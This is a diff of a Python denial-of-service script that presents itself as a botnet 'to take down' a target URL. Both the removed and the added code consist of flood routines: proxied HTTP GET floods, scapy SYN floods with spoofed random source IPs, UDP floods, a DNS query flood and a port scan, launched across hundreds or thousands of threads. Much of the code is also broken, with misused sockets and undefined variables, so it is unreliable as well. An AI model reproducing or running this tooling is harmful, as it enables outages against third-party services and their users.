@@ -1,10 +1,10 @@
 import socket
-import threading
 import random
-import dns.resolver
 import requests
+import threading
+import subprocess
 import time
-import sys
+from scapy.all import *
 
 credit = """
 \033[1;36m
@@ -31,284 +31,138 @@ credit = """
 \033[1;36m
 """
 print(credit)
-target_url = input("TARGET URL TO TAKE DOWN: ")
-target_port = input("TARGET PORT: ")
-botnet_size = 10000
+target_url = "TARGET_URL"
+start_port = 1
+end_port = 100
 fake_ip = '66.118.234.34:22'
 
-proxy_list = []
-with open("cazzy.txt", "r") as file:
-    proxy_list = file.read().splitlines()
+def generate_user_agent():
+    with open("user_agents.txt", "r") as file:
+        user_agents = file.read().splitlines()
+    return random.choice(user_agents)
 
-def get_ip_addresses(url):
-    try:
-        answers = dns.resolver.resolve(url, 'A')
-        ip_addresses = [str(rdata) for rdata in answers]
-        return ip_addresses
-    except:
-        return []
+def send_get_request(url, proxy):
+    headers = {
+        "User-Agent": generate_user_agent()
+    }
+    proxies = {
+        "http": proxy,
+        "https": proxy
+    }
+    response = requests.get(url, headers=headers, proxies=proxies)
+    return response
 
-def generate_fake_ip():
-    fake_ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
-    return fake_ip
+def generate_malicious_ip():
+    ip_list = []
+    for _ in range(10000):  
+        ip = ""
+        for _ in range(4):
+            ip += str(random.randint(1, 255)) + "."
+        ip = ip[:-1]
+        ip_list.append(ip)
+    return ip_list
 
-def spoofer():
-    addr = [192, 168, 0, 1]
-    d = '4.240.112.191'
-    addr[0] = str(random.randrange(11, 197))
-    addr[1] = str(random.randrange(0, 255))
-    addr[2] = str(random.randrange(0, 255))
-    addr[3] = str(random.randrange(2, 254))
-    assembled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
-    return assembled
-
-def udp_flood(target_ip, spoofed_ip, proxy_ip, proxy_port):
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect((proxy_ip, int(proxy_port)))
-
-        fake_ip = generate_fake_ip()
-        message = "GET /" + target_ip + " HTTP/1.1\r\n"
-        message += "Host: " + target_ip + "\r\n"
-        message += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\r\n"
-        message += "Accept-Language: en-US,en;q=0.9\r\n"
-        message += "Accept-Encoding: gzip, deflate\r\n"
-        message += "Connection: keep-alive\r\n"
-        message += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n\r\n"
-
-        packet_count = random.randint(10000, 20000) 
-
-        for _ in range(packet_count):
-            s.sendto(message.encode('ascii'), (fake_ip, target_port))
-
-        print(f"Target IP: {target_ip} | Spoofed IP: {fake_ip} | Proxy: {proxy_ip}:{proxy_port} | UDP flood sent (Increased speed and packet count)")
-
-        s.close()
-    except:
-        pass
-
-def syn_flood(target_ip, spoofed_ip, proxy_ip, proxy_port):
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((proxy_ip, int(proxy_port)))
-
-        fake_ip = generate_fake_ip()
-        message = "GET /" + target_ip + " HTTP/1.1\r\n"
-        message += "Host: " + target_ip + "\r\n"
-        message += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\r\n"
-        message += "Accept-Language: en-US,en;q=0.9\r\n"
-        message += "Accept-Encoding: gzip, deflate\r\n"
-        message += "Connection: keep-alive\r\n"
-        message += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n\r\n"
-
-        packet_count = random.randint(10000, 20000) 
-
-        for _ in range(packet_count):
-            s.send(message.encode('ascii'))
-
-        print(f"Target IP: {target_ip} | Spoofed IP: {fake_ip} | Proxy: {proxy_ip}:{proxy_port} | SYN flood sent (Increased speed and packet count)")
-
-        s.close()
-    except:
-        pass
-
-def http_flood(target_ip, spoofed_ip, proxy_ip, proxy_port):
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((proxy_ip, int(proxy_port)))
-
-        fake_ip = generate_fake_ip()
-        message = "GET /" + target_ip + " HTTP/1.1\r\n"
-        message += "Host: " + target_ip + "\r\n"
-        message += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\r\n"
-        message += "Accept-Language: en-US,en;q=0.9\r\n"
-        message += "Accept-Encoding: gzip, deflate\r\n"
-        message += "Connection: keep-alive\r\n"
-        message += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n\r\n"
-
-        packet_count = random.randint(10000, 20000) 
-
-        for _ in range(packet_count):
-            s.send(message.encode('ascii'))
-
-        print(f"Target IP: {target_ip} | Spoofed IP: {fake_ip} | Proxy: {proxy_ip}:{proxy_port} | HTTP flood sent (Increased speed and packet count)")
-
-        s.close()
-    except:
-        pass
-
-def tcp_flood(target_ip, spoofed_ip, proxy_ip, proxy_port):
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((proxy_ip, int(proxy_port)))
-
-        fake_ip = generate_fake_ip()
-        message = "GET /" + target_ip + " HTTP/1.1\r\n"
-        message += "Host: " + target_ip + "\r\n"
-        message += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\r\n"
-        message += "Accept-Language: en-US,en;q=0.9\r\n"
-        message += "Accept-Encoding: gzip, deflate\r\n"
-        message += "Connection: keep-alive\r\n"
-        message += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n\r\n"
-
-        packet_count = random.randint(10000, 20000) 
-
-        for _ in range(packet_count):
-            s.send(message.encode('ascii'))
-
-        print(f"Target IP: {target_ip} | Spoofed IP: {fake_ip} | Proxy: {proxy_ip}:{proxy_port} | TCP flood sent (Increased speed and packet count)")
-
-        s.close()
-    except:
-        pass
-
-def ssl_tls_flood(target_ip, spoofed_ip, proxy_ip, proxy_port):
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((proxy_ip, int(proxy_port)))
-
-        fake_ip = generate_fake_ip()
-        message = "GET /" + target_ip + " HTTP/1.1\r\n"
-        message += "Host: " + target_ip + "\r\n"
-        message += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\r\n"
-        message += "Accept-Language: en-US,en;q=0.9\r\n"
-        message += "Accept-Encoding: gzip, deflate\r\n"
-        message += "Connection: keep-alive\r\n"
-        message += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n\r\n"
-
-        packet_count = random.randint(10000, 20000) 
-
-        for _ in range(packet_count):
-            s.send(message.encode('ascii'))
-
-        print(f"Target IP: {target_ip} | Spoofed IP: {fake_ip} | Proxy: {proxy_ip}:{proxy_port} | SSL/TLS flood sent (Increased speed and packet count)")
-
-        s.close()
-    except:
-        pass
-
-def icmp_flood(target_ip, spoofed_ip, proxy_ip, proxy_port):
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-        s.connect((proxy_ip, int(proxy_port)))
-
-        fake_ip = generate_fake_ip()
-        message = "GET /" + target_ip + " HTTP/1.1\r\n"
-        message += "Host: " + target_ip + "\r\n"
-        message += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\r\n"
-        message += "Accept-Language: en-US,en;q=0.9\r\n"
-        message += "Accept-Encoding: gzip, deflate\r\n"
-        message += "Connection: keep-alive\r\n"
-        message += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n\r\n"
-
-        packet_count = random.randint(10000, 20000) 
-
-        for _ in range(packet_count):
-            s.send(message.encode('ascii'))
-
-        print(f"Target IP: {target_ip} | Spoofed IP: {fake_ip} | Proxy: {proxy_ip}:{proxy_port} | ICMP flood sent (Increased speed and packet count)")
-
-        s.close()
-    except:
-        pass
-
-def dns_amplification(target_ip, spoofed_ip, proxy_ip, proxy_port):
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect((proxy_ip, int(proxy_port)))
-
-        fake_ip = generate_fake_ip()
-        message = "GET /" + target_ip + " HTTP/1.1\r\n"
-        message += "Host: " + target_ip + "\r\n"
-        message += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\r\n"
-        message += "Accept-Language: en-US,en;q=0.9\r\n"
-        message += "Accept-Encoding: gzip, deflate\r\n"
-        message += "Connection: keep-alive\r\n"
-        message += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n\r\n"
-
-        packet_count = random.randint(10000, 20000) 
-
-        for _ in range(packet_count):
-            s.sendto(message.encode('ascii'), (fake_ip, target_port))
-
-        print(f"Target IP: {target_ip} | Spoofed IP: {fake_ip} | Proxy: {proxy_ip}:{proxy_port} | DNS amplification attack sent (Increased speed and packet count)")
-
-        s.close()
-    except:
-        pass
-
-def ddos_attack():
+def perform_ddos_attack(proxy_list, bot_count):
     while True:
-        try:
-            target_ip = random.choice(get_ip_addresses(target_url))
-            spoofed_ip = spoofer()
-            proxy = random.choice(proxy_list)
-            proxy_ip, proxy_port = proxy.split(":")
+        url = f"http://{target_url}"
+        if target_url.startswith("https"):
+            url = f"https://{target_url}"
+        
+        proxy = random.choice(proxy_list)
+        response = send_get_request(url, proxy)
+        print(f"Botnet {bot_count}: DDoS attack on {url} using proxy {proxy}...")
 
-            attack_type = random.randint(1, 7)
+        time.sleep(0.001) 
 
-            if attack_type == 1:
-                udp_flood(target_ip, spoofed_ip, proxy_ip, proxy_port)
-            elif attack_type == 2:
-                syn_flood(target_ip, spoofed_ip, proxy_ip, proxy_port)
-            elif attack_type == 3:
-                http_flood(target_ip, spoofed_ip, proxy_ip, proxy_port)
-            elif attack_type == 4:
-                tcp_flood(target_ip, spoofed_ip, proxy_ip, proxy_port)
-            elif attack_type == 5:
-                ssl_tls_flood(target_ip, spoofed_ip, proxy_ip, proxy_port)
-            elif attack_type == 6:
-                icmp_flood(target_ip, spoofed_ip, proxy_ip, proxy_port)
-            else:
-                dns_amplification(target_ip, spoofed_ip, proxy_ip, proxy_port)
+def scan_ports():
+    for port in range(start_port, end_port + 1):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(1)
+        result = sock.connect_ex((target_url, port))
+        if result == 0:
+            print(f"Port {port} is open")
+        sock.close()
 
-            time.sleep(random.uniform(0.1, 0.5)) 
-        except:
-            pass
+def dns_amplification_attack(target_ip):
+    target_port = 53
+    query = b"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x04test\x03com\x00\x00\x01\x00\x01"
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        sock.sendto(query, (target_ip, target_port))
 
-def create_botnet():
-    for _ in range(botnet_size):
-        thread = threading.Thread(target=ddos_attack)
+def syn_flood_attack(target_ip):
+    target_port = 80
+    
+    while True:
+        ip = IP(src=RandIP(), dst=target_ip)
+        tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
+        packet = ip / tcp
+        send(packet)
+
+def http_flood_attack(target_url):
+    while True:
+        response = requests.get(target_url)
+        print(f"HTTP Flood Attack on {target_url}...")
+
+def send_udp_packets():
+    while True:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.sendto(bytes(random.randint(0, 255) for _ in range(65535)), (target_ip, target_port))
+
+def send_tcp_syn_packets():
+    while True:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((target_ip, target_port))
+        sock.send(b"SYN Flood Attack")
+
+def send_http_get_requests():
+    while True:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((target_ip, target_port))
+        request = b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n"
+        sock.send(request)
+
+def execute_script():
+    # Read the proxy list from a txt file
+    proxy_list = []
+    with open("proxy_list.txt", "r") as file:
+        proxy_list = file.read().splitlines()
+
+    udp_thread = threading.Thread(target=send_udp_packets)
+    tcp_syn_thread = threading.Thread(target=send_tcp_syn_packets)
+    http_thread = threading.Thread(target=send_http_get_requests)
+
+    udp_thread.start()
+    tcp_syn_thread.start()
+    http_thread.start()
+
+    botnet_count = 0
+    ddos_attack_threads = []
+    for _ in range(500):
+        botnet_count += 1
+        ddos_attack_thread = threading.Thread(target=perform_ddos_attack, args=(proxy_list, botnet_count))
+        ddos_attack_threads.append(ddos_attack_thread)
+
+    for thread in ddos_attack_threads:
         thread.start()
 
-def stop_attack():
-    print("Stopping the DDoS attack...")
-    sys.exit()
+    scan_ports()
 
-def check_botnet_status():
-    print("Checking botnet status...")
-    if botnet_size > 0:
-        print("Botnet is active and ready to launch attacks!")
-    else:
-        print("Botnet is offline. Unable to launch attacks.")
-check_botnet_status()
+    dns_amplification_thread = threading.Thread(target=dns_amplification_attack, args=(target_url,))
+    dns_amplification_thread.start()
 
-def check_website(url):
-    if not url.startswith("http://") and not url.startswith("https://"):
-        url = "http://" + url
+    syn_flood_thread = threading.Thread(target=syn_flood_attack, args=(target_url,))
+    syn_flood_thread.start()
 
-    try:
-        response = requests.get(url)
-        if response.status_code >= 200 and response.status_code < 300:
-            print("Valid URL")
-            print("Loading...")
-            time.sleep(5)
-            print("Successfully launching the DDoS attack!")
+    http_flood_thread = threading.Thread(target=http_flood_attack, args=(target_url,))
+    http_flood_thread.start()
 
-            check_botnet_status()
+    for thread in ddos_attack_threads:
+        thread.join()
+    dns_amplification_thread.join()
+    syn_flood_thread.join()
+    http_flood_thread.join()
 
-            create_botnet()
-            print("Botnet created!")
-            print("Press CTRL+C or CTRL+Z to stop the attack.")
-            signal.signal(signal.SIGINT, stop_attack)
-            signal.signal(signal.SIGTSTP, stop_attack)
-        else:
-            print("Sorry, the website URL is not valid.")
-    except:
-        print("Sorry, the website URL is not valid.")
-
-check_website(target_url)
-
-
-
-
+if __name__ == "__main__":
+    execute_script()
